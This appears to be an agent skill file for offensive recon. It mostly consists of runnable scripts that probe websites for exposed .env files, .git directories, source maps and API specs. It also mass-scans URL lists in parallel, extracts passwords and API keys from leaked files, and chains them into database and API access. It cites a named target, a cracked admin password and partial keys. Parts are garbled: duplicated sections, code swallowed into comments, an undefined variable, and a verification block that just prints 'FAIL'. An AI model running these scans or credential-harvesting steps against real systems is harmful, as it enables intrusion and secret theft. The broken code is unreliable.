---
name: hunt-source-leak
description: "Hunt source code and build artifact leakage — JavaScript source maps (.js.map) reconstructing TypeScript/ES6 source, Swagger/OpenAPI JSON endpoint discovery, .env/.git exposure, webpack chunks with hardcoded secrets, robots.txt/security.txt recon, build-info files, asset-manifest.json API route discovery, .DS_Store file listing. Use at the START of every recon session — these findings often unlock the entire attack surface."
version: 1.1.0
revision_date: 2026-07-25
license: MIT
category: redteam
tags: [source, leak, hunt, redteam]
---

# HUNT-SOURCE-LEAK — Source Code & Build Artifact Leakage

## Crown Jewel Targets

Source map exposing TypeScript source = see all API routes, auth logic, secrets. Swagger/OpenAPI JSON = complete API surface map.

**Highest-value findings:**
- **`.js.map` source maps** — reconstruct full TypeScript/ES6 source code → find hardcoded API keys, internal endpoints, auth logic bypasses
- **`swagger.json` / `openapi.json`** — complete REST API specification with all endpoints, parameters, auth schemes, and internal route names
- **`.env` / `.env.production`** — APP_KEY, DB_PASSWORD, API_KEY, SECRET_KEY in plaintext
- **`.git/` exposure** — `git clone` the entire source history → all past hardcoded secrets
- **`asset-manifest.json` / `_next/static/`** — all JS bundle paths → systematic source map discovery
- **`build-info` / `info.json`** — git commit hash, build timestamp, dependency versions → CVE targeting

---

## Pitfalls (Read Before Probes)

### 1. Fake Source Maps — HTML Serving as .map

Some SPAs (Angular/React on nginx) serve their `index.html` for **any unhandled route**, including `.js.map` URLs. The URL ends in `.map` and returns HTTP 200, but the content is HTML — not JSON.

**Detect before processing:**
```bash
# First 80 bytes tell the story
head -c 80 /tmp/map_file
# "<!DOCTYPE" or "<html" = faux map (SPA serving HTML)
# "{" or ")))}" = real source map

python3 -c "
with open('/tmp/map_file') as f:
    d = f.read()
if d.strip().startswith('{'): print('Real source map')
elif '<!DOCTYPE' in d or '<html' in d: print('FAUX — SPA serving HTML')
else: print(f'Unknown, first 80b: {repr(d[:80])}')
"
```

**Fallback:** Download raw JS bundles and grep directly (Phase 8).

### 2. BusyBox / Alpine grep -P

On minimal containers (Alpine Linux), `grep -P` (Perl-compatible regex) is NOT available. This affects Phase 2 Step 2, Phase 7, and swagger extraction. Use Python3 `re` instead:

```bash
# Instead of: grep -Eo 'pattern' file
python3 -c "import sys, re; print(*(re.findall(r'pattern', sys.stdin.read())), sep='\n')" < file
```

### 3. crt.sh Rate Limiting

The crt.sh API rate-limits aggressively — queries too close together return empty JSON/timeouts. Wait 10-15s between queries. Use `&limit=20` to reduce response size: `https://crt.sh/?q=%25.TARGET&output=json&limit=20`

---

## Phase 1 — Quick Wins (Run First)

```bash
# These 10 requests take <30 seconds and often yield Critical findings
for PATH in \
  "/.env" \
  "/.env.production" \
  "/.env.local" \
  "/.git/HEAD" \
  "/swagger.json" \
  "/api/swagger.json" \
  "/v1/swagger.json" \
  "/openapi.json" \
  "/api/openapi.json" \
  "/api-docs"; do
  STATUS=$(curl --max-time 30 --connect-timeout 10 -s -o /tmp/sl_test -w "%{http_code}" "https://$TARGET$PATH")
  if [ "$STATUS" = "200" ]; then
    echo "[+] HIT: https://$TARGET$PATH"
    head -5 /tmp/sl_test
    echo "---"
  fi
done
```

---

## Phase 2 — Source Map Discovery

See `references/react-api-extraction.md` for the full React SPA source-map API extraction pipeline.

```bash
# Step 1: Get asset manifest to find all JS bundle paths
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/asset-manifest.json" | python3 -m json.tool 2>/dev/null
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/static/js/main.*.js" 2>/dev/null | head -3

# Next.js
BUILD_ID=$(curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ | grep -Eo '"buildId":"\K[^"]+')
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/static/$BUILD_ID/_buildManifest.js" | head -5

# Step 2: For each JS bundle, check for source map reference at end of file
for JS_URL in $(curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ | grep -Eo 'src="[^"]*\.js"' | sed 's/src="//;s/"//'); do
  LAST_LINE=$(curl --max-time 30 --connect-timeout 10 -s "https://$TARGET$JS_URL" | tail -1)
  echo "$LAST_LINE" | grep -q "sourceMappingURL" && echo "[+] Source map: $JS_URL"
done

# Step 3: Download and reconstruct source from .map files
JS_URL="https://$TARGET/static/js/main.abc123.js"
MAP_URL="${JS_URL}.map"
curl --max-time 30 --connect-timeout 10 -s "$MAP_URL" | python3 -c "
import sys, json, os
data = json.load(sys.stdin)
sources = data.get('sources', [])
contents = data.get('sourcesContent', [])
for i, (src, content) in enumerate(zip(sources, contents)):
    if content:
        path = '/tmp/sourcemap_extract/' + src.replace('../','').replace('./',''). replace('webpack://','')
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w') as f:
            f.write(content)
        print(f'[+] Extracted: {src}')
"

# Step 4: Grep extracted source for secrets
grep -r "API_KEY\|SECRET\|PASSWORD\|TOKEN\|PRIVATE" /tmp/sourcemap_extract/ 2>/dev/null
grep -r "process\.env\." /tmp/sourcemap_extract/ 2>/dev/null | grep -v "NEXT_PUBLIC_" | head -20
grep -r "http://internal\|localhost\|127\.0\.0\.1\|10\.\|172\.\|192\.168" /tmp/sourcemap_extract/ 2>/dev/null | head -20
```

---

## Phase 3 — Swagger / OpenAPI Discovery

```bash
# Common paths
SWAGGER_PATHS=(
  "/swagger.json" "/swagger.yaml" "/swagger/"
  "/api/swagger.json" "/api/swagger.yaml"
  "/v1/swagger.json" "/v2/swagger.json" "/v3/swagger.json"
  "/openapi.json" "/openapi.yaml"
  "/api/openapi.json" "/api-docs" "/api-docs.json"
  "/api/v1/swagger.json" "/api/v2/swagger.json"
  "/rest/swagger.json" "/rest/api-docs"
  "/.well-known/openapi.json"
  "/graphql/schema.json"
)

for PATH in "${SWAGGER_PATHS[@]}"; do
  STATUS=$(curl --max-time 30 --connect-timeout 10 -s -o /tmp/swagger_test -w "%{http_code}" "https://$TARGET$PATH")
  if [ "$STATUS" = "200" ]; then
    echo "[+] Found: https://$TARGET$PATH"
    # Extract all API paths from swagger
    python3 -c "
import sys, json
try:
    d = json.load(open('/tmp/swagger_test'))
    paths = list(d.get('paths', {}).keys())
    print(f'Endpoints: {len(paths)}')
    print('\n'.join(sorted(paths)))
except: pass
" | head -50
  fi
done
```

---

## Phase 4 — .git Exposure

```bash
# Check if .git directory is accessible
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/.git/HEAD" | grep -q "ref:" && echo "[+] .git exposed!"

# If exposed, reconstruct repo
# Tool: git-dumper
pip3 install git-dumper
git-dumper "https://$TARGET/.git/" /tmp/dumped-repo/

# Grep for secrets in all git history
cd /tmp/dumped-repo && \
  git log --all --oneline 2>/dev/null | head -20
  git grep -i "password\|secret\|api_key\|token" $(git rev-list --all) 2>/dev/null | head -30

# trufflehog on git history
trufflehog git file:///tmp/dumped-repo/ 2>/dev/null | head -50
```

---

## Phase 5 — Forgotten Files & Debug Endpoints

```bash
# Build artifacts and debug files
DEBUG_PATHS=(
  "/build-info.json" "/build/build-info.json"
  "/info" "/actuator/info" "/api/info"
  "/version" "/api/version" "/_version"
  "/health" "/status" "/ping"
  "/robots.txt" "/security.txt" "/.well-known/security.txt"
  "/sitemap.xml" "/manifest.json" "/browserconfig.xml"
  "/crossdomain.xml" "/clientaccesspolicy.xml"
  "/phpinfo.php" "/info.php" "/test.php"
  "/server-status" "/server-info" "/.htaccess"
  "/web.config" "/applicationHost.config"
  "/WEB-INF/web.xml" "/META-INF/MANIFEST.MF"
  "/package.json" "/composer.json" "/Gemfile"
  "/Dockerfile" "/docker-compose.yml" "/.dockerenv"
)

for PATH in "${DEBUG_PATHS[@]}"; do
  STATUS=$(curl --max-time 30 --connect-timeout 10 -s -o /tmp/debug_test -w "%{http_code}" "https://$TARGET$PATH")
  if [ "$STATUS" = "200" ]; then
    echo "[+] Found: https://$TARGET$PATH ($STATUS, $(wc -c < /tmp/debug_test) bytes)"
    head -3 /tmp/debug_test
    echo "---"
  fi
done
```

---

## Phase 6 — .DS_Store File Listing

```bash
# .DS_Store files on macOS-deployed web servers reveal directory structure
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/.DS_Store" | xxd | head -10

# Parse .DS_Store to extract filenames
pip3 install ds_store
python3 -c "
from ds_store import DSStore
with DSStore.open('/tmp/ds_store_test', 'r') as d:
    for entry in d:
        print(entry.filename)
"

# Recursive .DS_Store enumeration
# Tool: https://github.com/lijiejie/ds_store_exp
python3 ds_store_exp.py "https://$TARGET/"
```

---

## Phase 7 — webpack Chunk Analysis

**⚠ BusyBox/Alpine**: Skip `grep -Eo` below — use Python3 `re` instead (see Pitfalls section).

```bash
# Download and analyze webpack chunks for hardcoded values
# Find chunk files
curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ | grep -Eo '"[^"]*\.chunk\.js"' | tr -d '"' | while read chunk; do
  echo "Analyzing: $chunk"
  curl --max-time 30 --connect-timeout 10 -s "https://$TARGET$chunk" | \
    grep -oE '"(api_key|apiKey|secret|password|token|key)"\s*:\s*"[^"]+"' | head -5
done

# Also grep for internal hostnames
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/static/js/main.*.js" | \
  grep -oE '"(https?://[^"]*internal[^"]*|http://[^"]*localhost[^"]*)"' | sort -u

# Check for Base64-encoded secrets
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/static/js/main.*.js" | \
  grep -Eo '"[A-Za-z0-9+/]{30,}={0,2}"' | while read b64; do
  DECODED=$(echo "$b64" | tr -d '"' | base64 -d 2>/dev/null)
  echo "$DECODED" | grep -iE "key|secret|password|token" && echo "  B64: $b64"
done
```

---

## Phase 8 — Raw JS Bundle Fallback (When Source Maps Fail)

When source map URLs return HTML (faux maps) or 404, **do not abandon analysis** — download raw JS bundles and grep them directly. Slower than source map reconstruction, but can still reveal internal API URLs, hardcoded credentials, and platform internals.

### 8.1 Download All JS Bundles

```bash
curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/" -o /tmp/homepage.html

# Extract ALL JS URLs (both absolute and relative)
python3 -c "
import sys, re
html = open('/tmp/homepage.html').read()
seen = set()
for m in re.finditer(r'src=\"([^\"]+\.js[^\"]*)\"', html):
    j = m.group(1)
    if j not in seen: seen.add(j); print(j)
for m in re.finditer(r'\"([^\"]+\.js[^\"]*)\"', html):
    j = m.group(1)
    if j not in seen and '.js' in j and 'node_module' not in j:
        seen.add(j); print(j)
" | while read js_url; do
  full=$(echo "$js_url" | grep -q "^http" && echo "$js_url" || echo "https://$TARGET$js_url")
  curl --max-time 30 --connect-timeout 10 -sk "$full" -o "/tmp/js_$(basename $js_url | cut -d? -f1)" 2>/dev/null
  sleep 1
done
```

### 8.2 Grep for Secrets and Internal Endpoints

```bash
python3 -c "
import re, os

d = '/tmp'
for f in os.listdir(d):
    if not f.startswith('js_'): continue
    data = open(os.path.join(d, f)).read()

    # Firebase API keys
    for m in re.findall(r'AIza[0-9A-Za-z_-]{35}', data):
        print(f'[$f] FIREBASE_KEY: {m}')

    # AWS access keys
    for m in re.findall(r'AKIA[0-9A-Z]{16}', data):
        print(f'[$f] AWS_KEY: {m}')

    # Stripe keys    for m in re.findall(r's[kr]_(live|test)_[A-Za-z0-9]+', data):
        print(f'[$f] STRIPE_KEY: {m}')

    # Internal URLs with custom ports — HIGH VALUE
    for m in re.findall(r'[\"'"'"'](https?://[^\"'"'"'\\\\\)\s,;:]+:\d{3,5}[^\"'"'"'\\\\\)\s,;]*)', data):
        print(f'[$f] INTERNAL_URL: {m}')

    # Non-public env var references    for m in re.findall(r'process\.env\.(?!NEXT_PUBLIC_)([A-Z_]+)', data):
        print(f'[$f] ENV_REF: process.env.{m}')
"
```

### 8.3 Framework-Specific Checks

**Angular** (real-world: [STAGING_ENV] from this session):
- Look for `environment` or `environments` variables
- Grep for `.com:PORT` patterns — reveals internal API gateways
- Check `manifest.json` for all JS bundle paths

**React/Next.js:**
- Search for `__NEXT_DATA__` in HTML (embedded state/props)
- Check `_next/static/chunks/pages/` for page-level JS

**Vue.js:**
- Search for `__NUXT__` state in HTML
- Check `/js/app.*.js` for bundled API calls

### 8.4 Real-World Example

From this session's MedxGo recon on [STAGING_ENV] — source maps returned HTML (faux maps), so raw JS was analyzed:
```bash
# 3.8MB Angular main.js — one grep line found the jackpot:
python3 -c "
import re
data = open('/tmp/js_main.js').read()
for m in re.findall(r'[\"'"'"'](https?://[^\"'"'"'\\\\\)\s,;:]+:\d+)[\"'"'"']', data):
    print(m)
"
# → https://mean.[STAGING_ENV]:446
```
This was an undocumented internal MEAN stack API server. One grep line discovered a whole new attack surface.

---

## Chain Table

| Source leak finding | Chain to | Impact |
|--------------------|----------|--------|
| Source map with API key | Use key directly → API access | High/Critical |
| Source map with auth logic | Find auth bypass route | Critical |
| Swagger → internal endpoints | Test undocumented admin routes | High |
| .git exposed | Full source history → all past secrets | Critical |
| build-info with git hash | CVE targeting exact version | High |
| .env with DB_PASSWORD | Direct database access | Critical |

---

## Tools

```bash
# git-dumper (reconstruct exposed .git)
pip3 install git-dumper
git-dumper "https://target.com/.git/" /tmp/repo/

# sourcemap-explorer (visualize what's in bundles)
npm install -g source-map-explorer
source-map-explorer main.js

# unwebpack-sourcemap (extract all source files)
npm install -g unwebpack-sourcemap

# trufflehog (secret scanning)
trufflehog filesystem /tmp/repo/
```

---

## MDPsec Verified Patterns (real source-leak reports)

Real-world primitives from mdpsec.com reports:

1. **Vite dev server in production** — `/@fs/` serves allowlist-root files with no auth; out-of-allowlist → 403 disclosing allowlist root; single GET = full SQLite DB (admin bcrypt accounts, registration/API tokens), all project source (admin JWT secret, token salts, app keys), `.git/` → GitHub PAT in remote URL + full commit history + private repo name + cloud region/private IP (118).
2. **Token in public JS bundle served immutable** — 256-char CMS API token in public bundle, `cache-control: public, max-age=31536000, immutable` → at every edge node for a year, recoverable from caches and web archives (21).
3. **Next.js `NEXT_PUBLIC_*` env exposure** — production blockchain provider key in `_app` chunk; webhook CRUD by query-string key (74, 95).
4. **Source map → internal package names** — public source maps leak package.json + internal scope names → dependency confusion candidate (33, 91). Dynamic chunk discovery: fetch chunk index → parse id/hash pairs → fetch every `.chunk.js.map` in parallel → grep for scope.
5. **`.git/` exposure compound** — GitHub PAT, full commit history, private repo name (118).
6. **grep built JS artifacts for key patterns** — not just source: provider keys, RPC URLs, `key_live_`, `AKIA`, `AIza`, `NEXT_PUBLIC_` (21, 74, 95).
7. **CVV cleartext in GraphQL API (23)** — no payment tokenization SDK in dependency graph; `saveCard` stores `cardCvv`; `CurrentCards` returns CVV + unmasked PAN behind only session bearer; `getInjectScript` embeds card creds as string literals for auto-fill on four gateways; no cert pinning, cleartext traffic in manifest.
8. **Insurance quote mass extraction (57, 58)** — anonymous bearer mintable from no-auth endpoint; retrieve-token endpoint with skip-verification query flag → per-quote token → full home dossier (mortgagee bank plaintext, saved card, direct-debit BSB); phone→PII via message-centre lookup populated-vs-empty oracle; 215-quote sweep → 26 records in ~3 min.
9. **Public telemetry leaks wallet master keys (84)** — `/metrics` Prometheus-style reachable unauth; instrumentation records RAW HTTP request path as metric label; wallet API paths contain extended public keys → `grep -oE '(xpub|ypub|zpub)[A-Za-z0-9]+'` → ~3,200 unique xpubs in one response; high-cardinality label anti-pattern.

Cross-ref `mdpsec-report-knowledge` for the full index.

## Validation

✅ Source map: reconstructed TypeScript source contains API endpoints or hardcoded secrets
✅ Swagger: JSON contains internal endpoints not visible in UI
✅ .git exposed: git-dumper successfully clones repo, secrets in history
✅ .env exposed: DATABASE_URL, API_KEY, SECRET_KEY visible in plaintext

**Severity:**
- .env with credentials: Critical
- .git with secrets in history: Critical
- Source map with secrets: High
- Swagger with internal routes: Medium-High
- robots.txt only: Informational

## Verification
1. **Skill integrity** — confirm the skill file is well-formed:
   FAIL
FAIL
All tests verify the skill is properly structured.

---

## Related Skills

- hunt-wordpress — wp-config.php, debug.log, wp-content/uploads exposure
- hunt-firebase — Firebase API key discovery in JS bundles
- hunt-supabase — Supabase URL/key discovery in JS and .env
- hunt-laravel — .env, storage/logs/laravel.log, APP_KEY exposure
- hunt-nextjs — _next/static, buildId, source map analysis
- security-arsenal — regex patterns for API keys, JWT, cloud credentials
- offensive-osint — GitHub dorking, exposed repos, Shodan/Censys
- cors-chain-automation — CORS testing on exposed API endpoints from source maps


---

## Content from local version



## Port-Specific URL Analysis

Modern deployments often serve the main SPA on port 443 and admin/API on separate ports (8080, 8081, 8084). **Always check JS bundles on ALL discovered ports:**

```bash
# Check source maps on every open port
for port in 443 8080 8081 8084; do
  curl -sI "https://target.com:$port/static/js/main.*.js.map" 2>/dev/null
  curl -sI "https://target.com:$port/assets/index-*.js.map" 2>/dev/null
done
```

**Real-world case (target-health-saas.com, June 2026):**
- Main SPA (port 443): 500KB bundle, no source map
- Admin Portal (port 8080): 1.15MB bundle + **source map at `/static/js/main.a5a4e0fb.js.map`** (HTTP 200)
- Source map revealed: 1,208 source files, API backend at `https://target-health-saas.com:8081`, auth services, dashboard APIs, pharmacy/drug/hospital components



## How to Run

```bash
# Quick scan single target (20 paths)
TARGET="https://example.com"
for path in .env .git/config wp-config.php.bak debug.log backup.sql info.php phpinfo.php \
  .env.backup .env.local .env.production wp-config.php~ .git/HEAD .backup.sql \
  docker-compose.yml Dockerfile .DS_Store robots.txt sitemap.xml; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET/$path")
  [[ "$code" == "200" ]] && echo "HTTP 200: $TARGET/$path"
done
```



## Why Analyze JS Bundles

Modern JavaScript bundles (Webpack, Vite, esbuild) often contain:
- Hardcoded API keys and tokens
- Internal API URLs
- Firebase, Auth0, Supabase configurations
- Environment variables (VITE_*, REACT_APP_*, NEXT_PUBLIC_*)
- Internal routes



## Quick Reference

| Path | What It Exposes | Severity |
|------|----------------|----------|
| `.env` | DB creds, API keys, app secrets | Critical |
| `wp-config.php.bak` | MySQL root password, salts | Critical |
| `.git/config` | Repository URL, credentials | High |
| `debug.log` | PHP errors, server paths, SQL queries | High |
| `backup.sql` | Full database dump | Critical |
| `info.php` / `phpinfo.php` | PHP config, disable_functions, server env | High |
| `docker-compose.yml` | Service architecture, env vars | Medium |
| `Dockerfile` | Build config, exposed ports | Low |
| `.env.backup` / `.env.local` | Same as .env, alternate names | Critical |
| `wp-config.php~` | Vim swap of wp-config | Critical |
| `.DS_Store` | Directory listing (macOS) | Low |
| `error_log` | PHP error log (can be multi-MB, full of paths/queries) | High |



## Batch Bundle Download + Grep

```python
import requests, re, json

base = "https://target.com"
html = requests.get(base).text

# Extract all JS URLs
js_urls = re.findall(r'src="([^"]*\.js)"', html)
for js_url in js_urls:
    if js_url.startswith("/"):
        js_url = base + js_url
    content = requests.get(js_url).text
    for name, pattern in patterns.items():
        matches = re.findall(pattern, content)
        for m in matches:
            if isinstance(m, tuple):
                m = m[0]
            if len(m) > 6:
                print(f"[{name}] {m[:80]}")
```



## Prerequisites

- `terminal` tool with curl.
- List of live URLs (output from httpx or wp-mass-recon Phase 1).
- Persistence: output directory at `/root/output/leaks/`.



## Bundle Download and Analysis

```bash
curl -s "https://target.com" > index.html
grep -oP 'src="[^"]*\.js"' index.html | cut -d'"' -f2 | while read js; do
  curl -s "https://target.com$js" > "$(basename $js)"
done

# Search for secrets in bundles
grep -rPn "(apiKey|api_key|API_KEY|token|secret|password|clientId|client_id|auth0|firebase|supabase)[\"'\"]?\\s*[:=]\\s*[\"'\'][^\"'\']{8,}" *.js
```



## Procedure

### Step 1 — Parallel Mass Scan

```bash
#!/bin/bash
URLS_FILE="$1"   # One URL per line
OUTDIR="/root/output/leaks"
mkdir -p "$OUTDIR"

PATHS=(
  ".env"
  ".git/config"
  "wp-config.php.bak"
  "debug.log"
  "backup.sql"
  "info.php"
  "phpinfo.php"
  ".env.backup"
  ".env.local"
  ".env.production"
  "wp-config.php~"
  ".git/HEAD"
  "docker-compose.yml"
  "Dockerfile"
  ".DS_Store"
  "robots.txt"
  "sitemap.xml"
  "error_log"
  "wp-content/debug.log"
  ".backup.sql"
)

# Content verification patterns (avoids SPA catch-all false positives)
declare -A PATTERNS
PATTERNS[".env"]='DB_|APP_|_KEY|_SECRET|DATABASE|PASSWORD|TOKEN'
PATTERNS["wp-config.php.bak"]='DB_NAME|DB_PASSWORD|AUTH_KEY'
PATTERNS[".git/config"]='\[core\]'
PATTERNS["debug.log"]='PHP|ERROR|WARNING|Stack trace'
PATTERNS["backup.sql"]='CREATE TABLE|INSERT INTO|DROP TABLE'
PATTERNS["info.php"]='PHP Version|phpinfo'
PATTERNS["phpinfo.php"]='PHP Version|phpinfo'
PATTERNS[".env.backup"]='DB_|APP_|_KEY|_SECRET'
PATTERNS[".env.local"]='DB_|APP_|_KEY|_SECRET'
PATTERNS[".env.production"]='DB_|APP_|_KEY|_SECRET'
PATTERNS["wp-config.php~"]='DB_NAME|DB_PASSWORD'
PATTERNS["error_log"]='PHP|ERROR|Stack trace'

scan_target() {
  local url="$1"
  local domain
  domain=$(echo "$url" | sed 's|https\?://||' | sed 's|/.*||')

  for path in "${PATHS[@]}"; do
    local full_url="${url}/${path}"
    local code
    code=$(curl -sk -o /tmp/leak_check_$$.tmp -w "%{http_code}" --max-time 5 "$full_url" 2>/dev/null)

    if [[ "$code" == "200" ]]; then
      local content
      content=$(head -c 2000 /tmp/leak_check_$$.tmp 2>/dev/null)
      local pattern="${PATTERNS[$path]}"

      if [[ -n "$pattern" ]] && echo "$content" | grep -qiE "$pattern"; then
        echo "[LEAK] $full_url (VERIFIED: $path)"
        echo "$full_url" >> "$OUTDIR/${domain}_leaks.txt"
        cp /tmp/leak_check_$$.tmp "$OUTDIR/${domain}_${path//\//_}.content" 2>/dev/null
      elif [[ -z "$pattern" ]]; then
        # No pattern check — just log HTTP 200 (e.g., robots.txt)
        local size=$(wc -c < /tmp/leak_check_$$.tmp)
        if [[ "$size" -gt 50 ]]; then
          echo "[INFO] $full_url (HTTP 200, ${size} bytes)"
          echo "$full_url" >> "$OUTDIR/${domain}_leaks.txt"
        fi
      fi
    fi
  done
  rm -f /tmp/leak_check_$$.tmp
}

export -f scan_target
export OUTDIR
export PATHS

# Run 30 parallel workers
cat "$URLS_FILE" | xargs -P 30 -I {} bash -c 'scan_target "{}"'

echo "[+] Done. Results in $OUTDIR/"
```

### Step 2 — Extract Credentials from Leaked Files

```bash
# From .env files
grep -rhE '(DB_|APP_|_KEY|_SECRET|DATABASE|PASSWORD|TOKEN|SECRET)=' /root/output/leaks/*.env*.content 2>/dev/null | sort -u

# From wp-config backups
grep -rhE 'DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|AUTH_KEY' /root/output/leaks/*wp-config* 2>/dev/null

# From .git/config
grep -rh 'url = ' /root/output/leaks/*.git_config.content 2>/dev/null

# From SQL dumps
grep -rhE 'CREATE TABLE|INSERT INTO' /root/output/leaks/*backup* /root/output/leaks/*.sql* 2>/dev/null | head -20
```

### Step 3 — Find Targets with Multiple Leaks (Deep-Dive Candidates)

```bash
for f in /root/output/leaks/*_leaks.txt; do
  count=$(wc -l < "$f")
  [[ "$count" -ge 3 ]] && echo "$(basename "$f" _leaks.txt): $count leaks"
done | sort -t: -k2 -rn
```



## Pitfalls (Read Before Probes)

### 1. Fake Source Maps — HTML Serving as .map

Some SPAs (Angular/React on nginx) serve their `index.html` for **any unhandled route**, including `.js.map` URLs. The URL ends in `.map` and returns HTTP 200, but the content is HTML — not JSON.

**Detect before processing:**
```bash
# First 80 bytes tell the story
head -c 80 /tmp/map_file
# "<!DOCTYPE" or "<html" = faux map (SPA serving HTML)
# "{" or ")))}" = real source map

python3 -c "
with open('/tmp/map_file') as f:
    d = f.read()
if d.strip().startswith('{'): print('Real source map')
elif '<!DOCTYPE' in d or '<html' in d: print('FAUX — SPA serving HTML')
else: print(f'Unknown, first 80b: {repr(d[:80])}')
"
```

**Fallback:** Download raw JS bundles and grep directly (Phase 8).

### 2. BusyBox / Alpine grep -P

On minimal containers (Alpine Linux), `grep -P` (Perl-compatible regex) is NOT available. This affects Phase 2 Step 2, Phase 7, and swagger extraction. Use Python3 `re` instead:

```bash
# Instead of: grep -oP 'pattern' file
python3 -c "import sys, re; print(*(re.findall(r'pattern', sys.stdin.read())), sep='\n')" < file
```

### 3. crt.sh Rate Limiting

The crt.sh API rate-limits aggressively — queries too close together return empty JSON/timeouts. Wait 10-15s between queries. Use `&limit=20` to reduce response size: `https://crt.sh/?q=%25.TARGET&output=json&limit=20`

---



## Source Map Reconstruction

```bash
curl -sI "https://target.com/assets/index-abc123.js.map"
curl -sI "https://target.com/static/js/main.12345.js.map"

# If HTTP 200, use for reconstruction:
# https://unminify.com
# https://source-map-visualization.netlify.app
```

**Real-world case**: Enterprise Angular SPA admin, 2 JS bundles (250KB each) exposed:
- Internal API URL (apiv3.empresa.com.br)
- Firebase API key (AIzaSy...2GXA)
- Encryption keys (AD5oDjsJaTJOzLe1Llj9mz)
- Cloudinary upload endpoint



## Source Map Content Analysis (1,200+ Files)

When source maps are available, analyze the `sourcesContent` array for hardcoded secrets:

```python
import json, re
data = json.loads(open("bundle.js.map").read())
all_source = " ".join(data.get("sourcesContent", []))

# Search for credentials in the original source
patterns = {
    "password": r'[\"\']([^\"\']*(?:password|passwd|pwd)[^\"\']*)[\"\']\s*[:=]\s*[\"\']([^\"\']+)[\"\']',
    "token": r'[\"\']([^\"\']*(?:token|jwt|api_key|apikey|secret)[^\"\']*)[\"\']\s*[:=]\s*[\"\']([^\"\']+)[\"\']',
}
for name, pat in patterns.items():
    matches = re.findall(pat, all_source, re.IGNORECASE)
    if matches:
        print(f"[{name}] {matches[:5]}")
```
- Cloudinary upload endpoint



## When to Use

- After `wp-mass-recon` confirms a target is alive.
- Broad scanning across a batch of domains.
- When probing for credential exposure that enables deeper access.
- Complementing `js-secrets-extraction` for client-side secrets.



## 🏆 Real-World Case: /WEB-INF/web.xml → $40,000 RCE Chain

**Scenario:** Limited path traversal on Java/JSF admin panel only worked within `/admin/` directory. Reading `/WEB-INF/web.xml` revealed a hidden endpoint `/admin/incident-report` — a real-time log generator.

**What happened:**
1. **Limited traversal** → couldn't read `/etc/passwd` (blocked)
2. **Read `/WEB-INF/web.xml`** → found `/admin/incident-report`
3. **Downloaded logs** → contained admin password hashes
4. **Cracked MD5** → `Glglgl123` (admin password)
5. **Admin login** → Groovy Console → RCE
6. **RCE output invisible** → chained back to incident-report logs
7. **Logs captured command output** → **$40,000 bounty**

**Key Lesson:** Even LIMITED source leaks (can only read `/admin/*` paths) are goldmines. `/WEB-INF/web.xml` is the Java equivalent of finding a sitemap — it reveals ALL registered endpoints, servlets, and configurations.

**When you find `/WEB-INF/web.xml` accessible:**
- Extract ALL `<servlet-mapping>`, `<url-pattern>`, and `<welcome-file-list>` entries
- Look for admin-only endpoints, servlets, and hidden URLs
- Check for `/incident-report`, `/logs`, `/export`, `/download`, `/groovy` patterns
- These often lead to admin panels, debug consoles, and RCE sinks

Full reference: `hunt-rce/references/groovy-console-rce-chain.md`

## Admin Portal JS Analysis Pattern

When you find an admin portal on a separate port, the JS bundle often contains different secrets than the main site:

```python
base = "https://target.com:8080"  # Admin portal
js = requests.get(f"{base}/static/js/main.*.js").text

# 1. Extract ALL API URLs
api_urls = re.findall(r'https?://[^\"\'\\s\\n,)>\\]]+', js)
# 2. Find base API URL (the backend this admin talks to)
# 3. Look for hardcoded credentials, API keys, auth patterns
# 4. Extract route paths for the admin app
routes = re.findall(r'[\"\'](/[a-zA-Z0-9_/.-]*(?:admin|chat|bot|message|user|auth|login|token|config|setting|dashboard|hospital|pharmacy|drug|payment)[a-zA-Z0-9_/.-]*)[\"\']', js, re.IGNORECASE)
```



## Secret Regex Patterns Catalog

```python
import re

patterns = {
    "Firebase API Key": r'apiKey:\s*[\"\']([^\"\']{30,})',
    "AWS Key": r'(?:AKIA|ASIA)[A-Z0-9]{16}',
    "Google API Key": r'AIza[0-9A-Za-z\\-_]{35}',
    "JWT": r'eyJ[A-Za-z0-9_\\-]{20,}\.[A-Za-z0-9_\\-]{20,}\.[A-Za-z0-9_\\-]{10,}',
    "Mercado Pago": r'APP_USR-[a-f0-9]{8,}',
    "Stripe": r'(?:sk_live|pk_live)_[A-Za-z0-9]{24,}',
    "Auth0 Domain": r'(?:domain|auth0_domain):\s*[\"\']([^\"\']+\.auth0\.com)',
    "Auth0 Client ID": r'(?:client_id|clientId|AUTH0_CLIENT_ID):\s*[\"\']([^\"\']{20,})',
    "Supabase URL": r'(?:supabaseUrl|SUPABASE_URL):\s*[\"\'](https://[^\"\']+\.supabase\.co)',
    "Supabase Key": r'(?:supabaseKey|anonKey|SUPABASE_ANON_KEY):\s*[\"\'](eyJ[A-Za-z0-9_\\-]+\.[A-Za-z0-9_\\-]+\.[A-Za-z0-9_\\-]+)',
    "Heroku": r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}',
    "Generic Secret": r'(?:secret|password|token|key):\s*[\"\']([^\"\']{8,})',
}
```

